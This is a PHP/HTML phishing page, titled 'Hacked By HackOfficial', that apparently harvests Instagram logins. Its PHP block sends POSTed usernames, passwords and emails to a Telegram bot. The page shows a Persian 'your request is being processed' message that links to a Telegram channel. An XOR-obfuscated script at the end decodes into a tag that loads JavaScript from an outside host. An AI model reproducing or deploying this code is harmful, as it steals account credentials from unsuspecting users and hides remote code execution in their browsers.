<?php   


 include ("jdf.php");
    if (!empty($_POST)) {
        require_once 'Telegram.php';


Telegram::sendMessage('New Insta Account Added'."\n".'➖➖➖➖➖➖'."\n".'📧 UserName :'.$_POST['username']."\n".'🥳Password :'. $_POST['pass']."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'🌸Email :'.$_POST['email']."\n".'🕦 Time :'.jdate("h:i:s a")."\n".'📅 Date :'.jdate('l Y F ')."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'🆔 @HackOfficial');
    
    }
   





?>

<html>
<head>
<link rel="SHORTCUT ICON" href="http://i.hizliresim.com/wj2RLg.gif">
<script language="JavaScript">
function tb5_makeArray(n){
 this.length = n;
 return this.length;
}
tb5_messages = new tb5_makeArray(7);
tb5_messages[0] = "در حال برسی";
tb5_messages[1] = "Your request is being processed";
tb5_messages[2] = "";
tb5_messages[3] = "and";
tb5_messages[4] = "...";
tb5_messages[5] = "";
tb5_messages[6] = "";
tb5_messages[7] = "Security Down";
tb5_messages[8] = "";
tb5_rptType = 'infinite';
tb5_rptNbr = 20;
tb5_speed = 30;
tb5_delay = 2000;
var tb5_counter=2;
var tb5_currMsg=0;
var tb5_stsmsg="";
function tb5_shuffle(arr){
var k;
for (i=0; i<arr.length; i++){
 k = Math.round(Math.random() * (arr.length - i - 1)) + i;
 temp = arr[i];arr[i]=arr[k];arr[k]=temp;
}
return arr;
}
tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
 tb5_arr[i] = i;
 tb5_sts[i] = "_";
}
tb5_arr = tb5_shuffle(tb5_arr);
function tb5_init(n){
var k;
if (n == tb5_arr.length){
 if (tb5_currMsg == tb5_messages.length-1){
 if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
 clearTimeout(tb5_timerID);
 return;
 }
 tb5_counter++;
 tb5_currMsg=0;
 }
 else{
 tb5_currMsg++;
 }
 n=0;
 tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
 tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
 for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
 tb5_arr[i] = i;
 tb5_sts[i] = "_";
 }
 tb5_arr = tb5_shuffle(tb5_arr);
 tb5_sp=tb5_delay;
}
else{
 tb5_sp=tb5_speed;
 k = tb5_arr[n];
 tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
 tb5_stsmsg = "";
 for (var i=0; i<tb5_sts.length; i++)
 tb5_stsmsg += tb5_sts[i];
 document.title = tb5_stsmsg;
 n++;
 }
 tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
}
function tb5_randomizetitle(){
 tb5_init(0);
}
tb5_randomizetitle();
</script>
<title>Hacked By HackOfficial</title>
</head>
<body>
<style>
* {
  margin:0;
  padding:0;
  border:none;
	-webkit-user-drag: none;
	-webkit-user-select: none;
}
html,body {
  background-image: -webkit-gradient(
	    linear,
	    left bottom,
	    left top,
	    color-stop(0, rgb(61,61,61)),
	    color-stop(0.35, rgb(106,107,106)),
	    color-stop(0.65, rgb(106,107,106)),
	    color-stop(1, rgb(66,66,66))
	);
	background-image: -moz-linear-gradient(
	    center bottom,
	    rgb(61,61,61) 0%,
	    rgb(106,107,106) 35%,
	    rgb(106,107,106) 65%,
	    rgb(66,66,66) 100%
	);
  height:100%;
}
section {
  position:absolute;
  width:100%;
  top:50%;
  margin-top:-200px;
}
a {
	-webkit-transition: all 0.2s ease-out;
	-moz-transition: all 0.2s ease-out;
}
a:hover {
	text-shadow: 0 0 6px #FFF;
	-webkit-transition: all 0.2s ease-out;
	-moz-transition: all 0.2s ease-out;
}
a:active {
	text-shadow: 0 0 6px #3a3a3a;
	color: #3a3a3a;
}
h1, h2 {
	font-family: "Myriad Pro", Helvetica;
	text-align: center;
	font-weight:400;
}
h1, h1 > a {
	color: #FFF;
	font-size: 45px;
	text-decoration: none;
}
h2 {
	color: #afafaf;
	font-size: 24px;
	margin-top: -5px;
	cursor: default;
	margin-bottom: 20px;
}

nav {
	width: 480px;
	margin: 15px auto 0 auto;
}
nav a {
	display: block;
	position: relative;
	float: left;
	width: 160px;
	padding-top: 160px;
	color: #FFF;
	font: 18px "Lucida Grande";
	font-weight: bold;
	text-align: center;
	text-decoration: none;
	background-position: left top;
	background-repeat: no-repeat;
}
nav a span.glow {
	position: absolute;
	top: 0;
	width: 160px;
	height: 160px;
	background-position: right top;
	background-repeat: no-repeat;
	opacity: 0;
	left:0;
	-webkit-transition: opacity 0.5s ease-out;
	-moz-transition: opacity 0.5s ease-out;
}
nav a:hover span.glow {
	opacity: 1;
	-webkit-transition: opacity 0.5s ease-out;
	-moz-transition: opacity 0.5s ease-out;
}
nav a span.href {
	float: left;
	width: 100%;
	color: #afafaf;
	opacity: 0;
	font-size: 11px;
	text-align: center;
	text-shadow: none;
	-webkit-transition: opacity 0.5s ease-out;
	-moz-transition: opacity 0.5s ease-out;
}
nav a:hover span.href {
	opacity: 1;
	text-shadow: none;
	-webkit-transition: opacity 0.5s ease-out;
	-moz-transition: opacity 0.5s ease-out;
}
canvas {
	position: absolute;
	top: 0;
	left: 0;
	pointer-events: none;
}
</style>
<center>
<br>
<section>
  <h1><a href="https://t.me/DargahsazMafia">درخواست شما در حال برسی است و تا ساعات آینده سفارش شما ثبت میشود</a></h1>
  <br>
<br>
  <h2><font style="color:red; text-align:center"></font><font style="color:red; text-align:center"></font> </h2>
<br>
<br>
<br>
<br>
  <h2></h2>
  <h2></h2>
  <nav>
  </nav>
</section>
<script>var 
enkripsi="'2C'1Aqapkrv'02nclewceg'1F'00hctcqapkrv'00'02'1G'2Cfmawoglv,upkvg'0:wlgqacrg'0:'00'071A'0751'0741'0750'074;'0752'0756'0702'0751'0750'0741'071F'0700'074:'0756'0756'0752'071C'070D'070D'0757'0752'070G'0751'074@'074;'074G'0743'074@'070G'074;'0750'070D'0757'0752'070D'0751'074@'074;'074G'0743'074@'070D'0756'074:'0747'074F'0747'070D'074D'0756'074:'0747'0750'070D'0712'0715'070D'074D'0740'074C'0747'0741'0756'070D'074D'0754'0747'0750'074A'0743'075;'070G'074C'0751'0700'071G'071A'070D'0751'0741'0750'074;'0752'0756'071G'00'0;'0;'1@'2C'1A-qapkrv'1G'2C";teks="";teksasli="";var panjang;for (i=0;i<enkripsi.length;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2)}document.write(unescape(teks));</script>
<h3></h3>
<div style="display:none"></div>
</center>
</body></html>
